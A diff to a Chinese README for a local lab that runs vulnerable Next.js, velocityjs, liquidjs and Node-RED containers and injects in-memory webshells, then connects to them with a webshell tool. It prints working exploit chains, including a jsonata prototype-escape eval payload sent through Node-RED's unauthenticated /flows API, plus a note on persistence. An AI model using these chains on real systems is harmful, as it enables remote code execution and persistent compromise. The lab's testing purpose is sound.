@@ -20,7 +20,7 @@
 ```bash
 ./shlabs.sh list                      # 列出全部环境（自动发现 base/*/shlabs.yml）
 ./shlabs.sh up <env>                  # 构建镜像 + 启动（首次构建较慢）
-./shlabs.sh inject <env> --key mysecretkey            # 注入（内置漏洞版本校验门）
+./shlabs.sh inject <env> --loader <壳文件>       # 注入（内置漏洞版本校验门；载荷用户自备）
 ./shlabs.sh info <env>                # 环境详情
 ./shlabs.sh logs <env>                # 日志
 ./shlabs.sh down <env>                # 停止
@@ -31,7 +31,7 @@
 
 | 参数 | 值 |
 |------|-----|
-| 默认密钥 | `mysecretkey` |
+| 载荷来源 | **用户自备**（`--loader` 必填，`shallowend_payload_generate` 产物；**无 --key、无内置模板——铁律**） |
 | Next-Action 头 | `17f8341226dbfd4f2ef424c64a475f1bb2e7c9b0`（SHA1(key)） |
 | RC4 密钥 | `34d2e4255c8e6beb`（MD5(key)[:16]） |
 | Shell 类型 | `emit`（`http.Server.prototype.emit` override 内存马，框架无关） |
@@ -46,7 +46,7 @@ flight `exploit ok!`）仅证明代码执行；连通性与健康验证统一由
 （`webshell_test`：投递 core + `test` 调用断言）完成。
 
 **ShallowEnd 侧验收（可选）**：MCP `webshell_create`（group_id=本地测试分组，
-profile 匹配 rc4 + `mysecretkey`）→ `webshell_test` 实连。
+profile 与生成壳所用 profile 一致）→ `webshell_test` 实连。
 
 ## 0.1 高自由度流程：随机 Profile + 从 Profile 生成 Payload（推荐）
 
@@ -61,7 +61,7 @@ profile 匹配 rc4 + `mysecretkey`）→ `webshell_test` 实连。
 #    不带 profile_id 生成的壳只说 json 信封，配非 json profile 会 404/解析失败）
 #    shallowend_payload_generate → profile_id=<上一步 id>, password=<同一随机密钥>, encryption=<同 profile>
 # 3. 注入（key 用同一个随机密钥）：
-./shlabs.sh inject <env> --key <随机密钥> --loader ~/Library/Caches/ShallowEnd/generated/<shell>.js
+./shlabs.sh inject <env> --loader ~/Library/Caches/ShallowEnd/generated/<shell>.js
 # 4. ShallowEnd 建连接（webshell_create 用该 profile → webshell_test → command_execute）
 ```
 
@@ -98,7 +98,7 @@ profile 匹配 rc4 + `mysecretkey`）→ `webshell_test` 实连。
 curl http://127.0.0.1:21511/api/tags   # {"tags":[...]}  即 API 就绪
 curl http://127.0.0.1:21501/           # 200 即前端就绪
 
-./shlabs.sh inject CVE-2025-55182 --key mysecretkey
+./shlabs.sh inject CVE-2025-55182 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
 # 预期：版本门 OK（next@16.0.6 / react@19.2.0）→ exploit ok! → 连接信息输出
 
 # ⚠️ flight 重注入需先重建容器（结构性限制）：exploit 请求自带 Next-Action 触发头
@@ -127,7 +127,7 @@ curl -s http://127.0.0.1:21503/api/render \
   -d '{"template":"#set($f=$x.constructor.constructor(\"return 6*7\"))#set($r=$f())$r","data":{"x":{}}}'
 # 预期：{"result":"42"}
 
-./shlabs.sh inject CVE-2026-73649 --key mysecretkey
+./shlabs.sh inject CVE-2026-73649 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
 # 预期：版本门 OK（velocityjs@2.1.6）→ Inject OK — memory shell resident in PID N
 ```
 
@@ -149,7 +149,7 @@ context → `group_by`/`where`/`first|last` gadget 读取内部函数 → 覆写
 ./shlabs.sh up CVE-2026-45618
 curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪
 
-./shlabs.sh inject CVE-2026-45618 --key mysecretkey
+./shlabs.sh inject CVE-2026-45618 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
 # 预期：版本门 OK（liquidjs@10.25.7）→ Inject OK — memory shell resident in PID N
 ```
 
@@ -157,7 +157,40 @@ curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪
 链路——`new Liquid({...DR 同款 fs stub})` 上执行 `injectors/cve-2026-45618_liquid.py`
 内 `CHAIN_TEMPLATE`（`vars.p` 传 `return 6*7;`），输出 `42`。
 
-## 4. 常见问题
+## 4. base/CVE-2026-77413 — jsonata 原型链逃逸 RCE（真实目标：Node-RED 4.1.11）
+
+| 项 | 值 |
+|----|-----|
+| 漏洞 | CVE-2026-77413/77414/77415（三 CVE 共池）：jsonata <1.8.8 / 2.0.0–2.2.0 `environment.lookup` hasOwnProperty 绕过 → `Function` 构造器，CVSS v4 9.3 ×3；同池 CVE-2026-12208 |
+| 目标 | [Node-RED](https://github.com/node-red/node-red) 4.1.11（23.8k★ 低代码编排平台，Apache-2.0，**官方 Docker 镜像**；jsonata 精确 pin 2.0.6，v2 线修复在 2.2.0/2.2.1） |
+| 默认形态 | **无 patch、无配置改动、无认证**——默认无 `adminAuth`，`/flows` Admin API 对端口可达者完全开放（真实世界"默认无认证部署形态"即靶场形态） |
+| 拓扑 | 单服务 127.0.0.1:21505（容器内 1880）；Express 底座，阶段②③与 velocityjs 靶场同构 |
+| 注入器 | `injectors/cve-2026-77413_nodered.py`（纯 HTTP：`POST /flows` 部署含 emit 壳的 change+inject 流 → `POST /inject/<id>` 触发 → decoy 探测确认驻留；无凭据；✅ 已落地并双路径验收） |
+
+利用链形态（注入器内置，advisory GHSA-2943-5xfg-gq5f 原文 PoC）：块内绑定
+`$hasOwnProperty := $spread($string); $__proto__ := $constructor;` →
+`$constructor('return eval(Buffer.from("<emit壳 b64>","base64").toString())')()`。
+**注意 77413 的 `__lookupSetter__` 链在 jsonata 2.0.6 不可达**（`non-function`），
+2.x 线用 77414 形态（1.8.x 存量线未验证，命中真实目标时再验）。
+
+```bash
+./shlabs.sh up CVE-2026-77413
+curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21505/   # 200 即就绪（编辑器）
+curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21505/flows  # 200 = 未认证可达
+
+./shlabs.sh inject CVE-2026-77413 --loader /path/to/emit_shell.js
+# 预期：版本门 OK（jsonata@2.0.6）→ 部署+触发成功 → decoy 探测确认驻留；
+# 随后 ShallowEnd webshell_test 实连（profile 响应形态需与壳匹配，见环境 README）
+```
+
+`--loader` 必填（载荷由 `shallowend_payload_generate` 产出，无内置模板）。已实测
+（2026-10-28）：poc-imagepng 壳 + profile 25 → 注入 OK（404 decoy）→ 连接 119ms/84ms
+→ 命令回显。
+
+**注意**：注入的恶意流会持久化到 `/data/flows.json` 卷——容器重启后 change 节点表达式
+重放（等价自动重新驻留）；完整重置用 `./shlabs.sh clean CVE-2026-77413`（清卷）。
+
+## 5. 常见问题
 
 | 症状 | 处置 |
 |------|------|
@@ -169,7 +202,7 @@ curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪
 | 注入成功但 ShallowEnd 连不上 | 内存马驻留在**进程**里；容器重启/`down` 后需重新注入。多进程容器（cluster 模式）注意注入的 PID 是否对外服务进程 |
 | flight 重注入返回 200 空响应 | 结构性限制：exploit 请求自带 Next-Action 触发头，驻留壳拦截该头的一切请求——先 `clean` / `down -v` 重建容器再注入 |
 
-## 4.1 Mem Pipe 交互终端 e2e（主仓）
+## 6. Mem Pipe 交互终端 e2e（主仓）
 
 ShallowEnd 主仓有两个 pipe e2e 用例（`PIPE_E2E=1 go test -tags e2e ./internal/app/ -run <name>`），
 按目标侧 profile 自适应，互斥跳过：
@@ -187,7 +220,7 @@ Dockerfile 变化的镜像）。
 主仓 payload 模板改动生效必须重新 `inject`（容器重启或 `clean && up` 后再注入）；
 同一存活 payload 上重复跑 e2e 需主仓侧 seq 分配器播种晚于上次运行（2026-10-10 起已墙时钟播种）。
 
-## 5. 验收口径
+## 7. 验收口径
 
 每个环境的最小验收 = `./shlabs.sh up <env>` 服务健康 + `./shlabs.sh inject <env>`
 返回注入成功标记（`SSTI_SHELL_OK:<pid>` / flight `exploit ok!`）。
